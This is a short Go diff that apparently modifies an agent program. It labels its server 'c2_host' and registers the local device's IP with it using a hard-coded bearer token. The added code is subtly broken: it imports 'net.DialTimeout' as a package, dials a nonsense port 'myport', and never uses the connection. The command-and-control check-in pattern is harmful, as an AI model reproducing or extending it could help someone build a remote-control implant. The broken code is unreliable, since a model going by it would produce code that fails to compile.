@@ -9,6 +9,9 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"time"
+
+	"net.DialTimeout"
 )
 
 func get_ip() net.IP {
@@ -64,9 +67,14 @@ func handler(w http.ResponseWriter, r *http.Request) {
 func api_call_addDevice() {
 
 	ipAddr := get_ip().String()
+	c2_host := "192.168.206.210"
+	url := "http://" + c2_host + ":8000/api/devices/addDevice"
 
-	url := "http://192.168.206.210:8000/api/devices/addDevice"
-
+	timeout := 1 * time.Second
+	conn, err := net.DialTimeout("tcp", c2_host+":myport", timeout)
+	if err != nil {
+		log.Println("Site unreachable, error: ", err)
+	}
 	// Create a Bearer string by appending string access token
 	var bearer = "Bearer " + "XxPFUhQ8R7kKhpgubt7v"
 
